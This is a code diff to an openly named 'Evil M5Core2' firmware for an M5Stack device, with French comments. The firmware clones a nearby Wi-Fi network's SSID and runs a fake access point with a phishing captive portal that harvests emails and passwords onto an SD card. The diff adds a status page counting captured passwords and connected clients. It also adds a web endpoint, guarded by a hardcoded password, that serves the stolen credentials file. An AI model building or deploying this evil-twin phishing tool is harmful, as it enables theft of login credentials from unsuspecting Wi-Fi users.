@@ -12,7 +12,7 @@ const byte DNS_PORT = 53;
 
 int currentIndex = 0, lastIndex = -1;
 bool inMenu = true;
-const char* menuItems[] = {"Scan WiFi", "Select Network", "Clone & Details" , "Start Captive Portal", "Stop Captive Portal" , "Change portal", "Check credentials", "Delete Credentials" };
+const char* menuItems[] = {"Scan WiFi", "Select Network", "Clone & Details" , "Start Captive Portal", "Stop Captive Portal" , "Change portal", "Check credentials", "Delete Credentials", "Monitor Status" };
 const int menuSize = sizeof(menuItems) / sizeof(menuItems[0]);
 String ssidList[100];
 int numSsid = 0;
@@ -20,12 +20,27 @@ bool isOperationInProgress = false;
 int currentListIndex = 0;
 String clonedSSID = "";  // Pour stocker le SSID cloné
 
+// Connecter à un réseau WiFi existant
+const char* ssid = "SSID"; // Remplacez avec le SSID de votre réseau
+const char* password = "PASS"; // Remplacez avec le mot de passe de votre réseau
+const char* accessWebPassword = "SecretPass";
+
 
 String portalFiles[10]; // Supposons que vous avez au maximum 10 fichiers
 int numPortalFiles = 0;
 String selectedPortalFile = "/sites/normal.html"; // portail par défaut
 int portalFileIndex = 0; // Index du fichier actuellement sélectionné
 
+
+// Variables pour le suivi des informations
+int nbClientsConnected = 0;
+int nbClientsWasConnected = 0;
+int nbPasswords = 0;
+bool isCaptivePortalOn = false;
+
+
+String macAddresses[10]; // Par exemple, pour stocker jusqu'à 10 adresses MAC
+int numConnectedMACs = 0;  // Variable pour stocker le nombre d'adresses MAC actuelles
 
 void setup() {
   M5.begin();
@@ -50,8 +65,26 @@ void setup() {
   M5.Display.println(" Evil M5Core2");
   M5.Display.setCursor(80, textY + 20);
   M5.Display.println("By 7h30th3r0n3");
-  // Ajouter un délai avant de passer à la suite du programme
-  fistScanWifiNetworks();
+//  displayJPG("/img/startup.jpg", 0, 0); // Ajustez le chemin et la position selon vos besoins
+  firstScanWifiNetworks();
+    // Configurer le mode WiFi en APSTA
+  WiFi.mode(WIFI_MODE_APSTA);
+
+  WiFi.begin(ssid, password);
+
+// Attente de la connexion avec une temporisation
+unsigned long startAttemptTime = millis();
+while (WiFi.status() != WL_CONNECTED && millis() - startAttemptTime < 3000) {
+    delay(500);
+    Serial.println("Connexion au WiFi...");
+}
+
+if (WiFi.status() == WL_CONNECTED) {
+    Serial.println("Connecté au WiFi");
+} else {
+    Serial.println("Connexion au WiFi échouée ou temps écoulé");
+}
+  
   if (!SD.begin(SDCARD_CSPIN, SPI, 25000000)) {
     Serial.println("Erreur d'initialisation de la carte SD");
     return;
@@ -60,12 +93,18 @@ void setup() {
 
 }
 
-void fistScanWifiNetworks() {
+/*void displayJPG(const char* filename, int xpos, int ypos) {
+  if (!M5.Display.drawJpgFile(SD, filename, xpos, ypos)) {
+    Serial.println("Failed to draw JPG file");
+  }
+}*/
+
+void firstScanWifiNetworks() {
     WiFi.mode(WIFI_STA);
     WiFi.disconnect();
     unsigned long startTime = millis();
     int n;
-    while (millis() - startTime < 5000) {
+    while (millis() - startTime < 3000) {
         n = WiFi.scanNetworks();
         if (n != WIFI_SCAN_RUNNING) break;
     }
@@ -134,6 +173,9 @@ void executeMenuItem(int index) {
     case 7:
       deleteCredentials();
       break;
+    case 8: // Index du nouvel élément de menu "Monitor Status"
+      displayMonitorPage1();
+      break;
   }
   isOperationInProgress = false;
 }
@@ -186,6 +228,8 @@ void scanWifiNetworks() {
   for (int i = 0; i < numSsid; i++) {
     ssidList[i] = WiFi.SSID(i);
   }
+  WiFi.mode(WIFI_MODE_APSTA);
+  WiFi.begin(ssid, password);
   waitAndReturnToMenu("Scan Completed");
 }
 
@@ -316,9 +360,10 @@ void cloneSSIDForCaptivePortal(String ssid) {
 
 void createCaptivePortal() {
     String ssid = clonedSSID.isEmpty() ? "FreeWifi" : clonedSSID;
-    WiFi.mode(WIFI_AP);
+    WiFi.mode(WIFI_MODE_APSTA);
     WiFi.softAP(clonedSSID.c_str());
     dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
+    isCaptivePortalOn = true;
 
     server.on("/", HTTP_GET, []() {
         String email = server.arg("email");
@@ -330,7 +375,22 @@ void createCaptivePortal() {
             servePortalFile(selectedPortalFile);
         }
     });
-
+    
+    server.on("/credentials", HTTP_GET, []() {
+        String password = server.arg("pass");
+        if (password == accessWebPassword) {
+            // Si le mot de passe est correct, envoyer le fichier 'credentials.txt'
+            File file = SD.open("/credentials.txt");
+            if (file) {
+                server.streamFile(file, "text/plain");
+                file.close();
+            } else {
+                server.send(404, "text/plain", "File not found");
+            }
+        } else {
+            server.send(403, "text/plain", "Unauthorized");
+        }
+    });
     server.onNotFound([]() {
         servePortalFile(selectedPortalFile); // Ou toute autre logique nécessaire
     });
@@ -357,6 +417,7 @@ void saveCredentials(const String& email, const String& password) {
         file.println("----------------------");
         file.close();
         Serial.println("Credentials " + email + ":" + password + "saved");
+        nbPasswords++;
     } else {
         Serial.println("Error opening file for writing");
     }
@@ -368,9 +429,9 @@ void stopCaptivePortal() {
 
   // Désactive le point d'accès WiFi
   WiFi.softAPdisconnect(true);
-
+ isCaptivePortalOn = false;
   // Remet l'appareil en mode station pour permettre la connexion à un réseau WiFi existant
-  WiFi.mode(WIFI_STA);
+  WiFi.mode(WIFI_MODE_APSTA);
 
   // Message de confirmation et retour au menu
   waitAndReturnToMenu("  Portal Stopped");
@@ -447,38 +508,43 @@ void changePortal() {
 
 void checkCredentials() {
     readCredentialsFromFile();
-    const int listDisplayLimit = M5.Display.height() / 18;
-    int listStartIndex = max(0, min(currentListIndex, numCredentials - listDisplayLimit));
-    
-    M5.Display.clear();
-    M5.Display.setTextSize(2);
-    for (int i = listStartIndex; i < min(numCredentials, listStartIndex + listDisplayLimit); i++) {
-        if (i == currentListIndex) {
-            M5.Display.fillRect(0, 25 + (i - listStartIndex) * 18, M5.Display.width(), 18, TFT_NAVY);
-            M5.Display.setTextColor(TFT_GREEN);
-        } else {
-            M5.Display.setTextColor(TFT_WHITE);
+    if (numCredentials == 0) {
+        // Aucun identifiant enregistré, affiche un message
+        waitAndReturnToMenu(" No crendentials...");
+    } else {
+        const int listDisplayLimit = M5.Display.height() / 18;
+        int listStartIndex = max(0, min(currentListIndex, numCredentials - listDisplayLimit));
+        
+        M5.Display.clear();
+        M5.Display.setTextSize(2);
+        for (int i = listStartIndex; i < min(numCredentials, listStartIndex + listDisplayLimit); i++) {
+            if (i == currentListIndex) {
+                M5.Display.fillRect(0, 25 + (i - listStartIndex) * 18, M5.Display.width(), 18, TFT_NAVY);
+                M5.Display.setTextColor(TFT_GREEN);
+            } else {
+                M5.Display.setTextColor(TFT_WHITE);
+            }
+            M5.Display.setCursor(10, 25 + (i - listStartIndex) * 18);
+            M5.Display.println(credentialsList[i]);
         }
-        M5.Display.setCursor(10, 25 + (i - listStartIndex) * 18);
-        M5.Display.println(credentialsList[i]);
-    }
-    M5.Display.display();
+        M5.Display.display();
 
-    while (!inMenu) {
-        M5.update();
-        if (M5.BtnA.wasPressed()) {
-            currentListIndex = max(0, currentListIndex - 1);
-            checkCredentials();
-        } else if (M5.BtnC.wasPressed()) {
-            currentListIndex = min(numCredentials - 1, currentListIndex + 1);
-            checkCredentials();
-        } else if (M5.BtnB.wasPressed()) {
-            inMenu = true;
-            drawMenu();  // Redessiner le menu après l'opération
-
+        while (!inMenu) {
+            M5.update();
+            if (M5.BtnA.wasPressed()) {
+                currentListIndex = max(0, currentListIndex - 1);
+                checkCredentials();
+            } else if (M5.BtnC.wasPressed()) {
+                currentListIndex = min(numCredentials - 1, currentListIndex + 1);
+                checkCredentials();
+            } else if (M5.BtnB.wasPressed()) {
+                inMenu = true;
+                drawMenu();  // Redessiner le menu après l'opération
+            }
         }
     }
 }
+
 
 void deleteCredentials() {
     // Ouvrir le fichier en mode écriture pour effacer son contenu
@@ -489,6 +555,7 @@ void deleteCredentials() {
         // Afficher le message de confirmation
         waitAndReturnToMenu("Deleted successfully");
         Serial.println("Credentials deleted successfully");
+        nbPasswords = 0;
     } else {
         // Afficher un message d'erreur
         waitAndReturnToMenu("Error..");
@@ -496,6 +563,71 @@ void deleteCredentials() {
     }
 }
 
+
+
+
+void displayMonitorPage1() {
+    M5.Display.clear();
+    M5.Display.setTextSize(2);
+    // Afficher les informations
+    M5.Display.setCursor(10, 30);
+    M5.Display.println("Clients Conn: " + String(nbClientsConnected));
+    M5.Display.setCursor(10, 60);
+    M5.Display.println("Clients Was: " + String(nbClientsWasConnected));
+    M5.Display.setCursor(10, 90);
+    M5.Display.println("Passwords: " + String(nbPasswords));
+    M5.Display.setCursor(10, 120);
+    M5.Display.println("SSID: " + clonedSSID);
+    M5.Display.setCursor(10, 150);
+    M5.Display.println("Portal: " + String(isCaptivePortalOn ? "On" : "Off"));
+    M5.Display.setCursor(10, 180);
+    M5.Display.println("Page: " + selectedPortalFile.substring(7));
+    M5.Display.display();
+   while (true) {
+          M5.update();
+  
+          if (M5.BtnA.wasPressed() || M5.BtnC.wasPressed()) {
+              displayMonitorPage2(); // Aller à la page 2
+              break;
+          } else if (M5.BtnB.wasPressed()) {
+              inMenu = true; // Retour au menu principal
+              drawMenu();
+              break;
+          }
+      }
+}
+
+void displayMonitorPage2() {
+    M5.Display.clear();
+    M5.Display.setTextSize(2);
+
+    // Supposons que vous avez une liste ou un tableau d'adresses MAC
+    // Par exemple: String macAddresses[] = { "AA:BB:CC:DD:EE:FF", "11:22:33:44:55:66" };
+    // Et un nombre correspondant de MACs connectés
+    int numConnectedMACs = 2;  // Remplacez par le nombre réel
+
+    for (int i = 0; i < numConnectedMACs; i++) {
+        int y = 30 + i * 20; // Calculer la position Y pour chaque adresse MAC
+        if (y > M5.Display.height() - 20) break; // S'assurer de ne pas déborder de l'écran
+
+        M5.Display.setCursor(10, y);
+        M5.Display.println(macAddresses[i]);
+    }
+
+    M5.Display.display();
+    while (true) {
+        M5.update();
+
+        if (M5.BtnA.wasPressed() || M5.BtnC.wasPressed()) {
+            displayMonitorPage1(); // Retour à la page 1
+            break;
+        } else if (M5.BtnB.wasPressed()) {
+            inMenu = true; // Retour au menu principal
+            drawMenu();
+            break;
+        }
+    }
+}
 
 void waitAndReturnToMenu(String message) {
   M5.Display.clear();
